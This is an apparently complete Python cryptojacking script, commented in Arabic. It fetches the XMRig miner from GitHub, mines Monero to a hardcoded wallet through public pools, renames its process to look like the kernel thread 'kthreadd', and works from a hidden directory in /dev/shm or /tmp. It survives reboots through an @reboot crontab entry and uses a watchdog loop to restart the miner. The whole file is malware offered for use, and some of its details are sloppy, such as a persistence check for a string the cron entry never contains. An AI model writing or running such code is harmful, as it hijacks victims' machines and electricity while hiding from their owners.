#!/usr/bin/env python3
import os, sys, subprocess, urllib.request, tarfile, ctypes, time, psutil, platform
from pathlib import Path

# إخفاء اسم العملية
try:
    ctypes.CDLL(None).prctl(15, b"kthreadd", 0, 0, 0)
except: pass

# الإعدادات المطلوبة بالضبط
WALLET = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
POOLS = ["pool.supportxmr.com:5555", "moneroocean.stream:10128"]
WORK_DIR = "/dev/shm/.sys" if os.path.exists("/dev/shm") else "/tmp/.sys"

# نريد استغلال 30 خيطًا منطقيًا فقط (من أصل 48)
MAX_THREADS = 30

os.makedirs(WORK_DIR, exist_ok=True)
os.chdir(WORK_DIR)

# تحميل XMRig مرة واحدة فقط
if not os.path.exists("x"):
    try:
        urllib.request.urlretrieve(
            "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz",
            "x.tgz"
        )
        with tarfile.open("x.tgz") as t:
            for m in t.getmembers():
                if m.name.endswith("xmrig") and open("x", "wb").write(t.extractfile(m).read())
        os.chmod("x", 0o755)
        os.remove("x.tgz")
    except: sys.exit(0)

# أفضل إعدادات مع 30 خيط فقط
FLAGS = [
    "./x",
    "--donate-level=0",
    "--randomx-1gb-pages",
    "--randomx-cache-qos",
    "--huge-pages-jit",
    "--cpu-priority=4",
    "--cpu-max-threads-hint=100",   # نعطيه 100% لكن بنحدد عدد الخيوط يدويًا بعد سطرين
    "--tls",
    "--keepalive",
    "--no-color"
]

def start_miner():
    # نستخدم cpu-affinity + threads لنضمن 30 خيط فقط
    cmd = FLAGS + [
        "--threads=30",                     # التحكم الدقيق
        "--cpu-affinity=0xFFFFFFFFFFFFFF",  # يستخدم أول 30 خيط منطقي فقط (48-bit mask)
        "-o", POOLS[0],
        "-u", WALLET,
        "-p", f"PHANTOM-30T-{platform.node()}"
    ]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# Persistence خفيف ونظيف (نفس السابق لكن بدون مبالغة)
def persistence():
    me = os.path.realpath(__file__ if "__file__" in globals() else sys.argv[0])
    try:
        c = subprocess.check_output("crontab -l 2>/dev/null ||:", shell=True).decode()
        if "PHANTOM-30T" not in c:
            subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {me}") | crontab -', shell=True)
    except: pass

# Watchdog بسيط وفعال
def watchdog():
    while True:
        running = any("xmrig" in " ".join(p.cmdline() or []) for p in psutil.process_iter() 
                    if p.cmdline())
        if not running:
            start_miner()
        time.sleep(480)

if __name__ == "__main__":
    persistence()
    start_miner()
    watchdog()
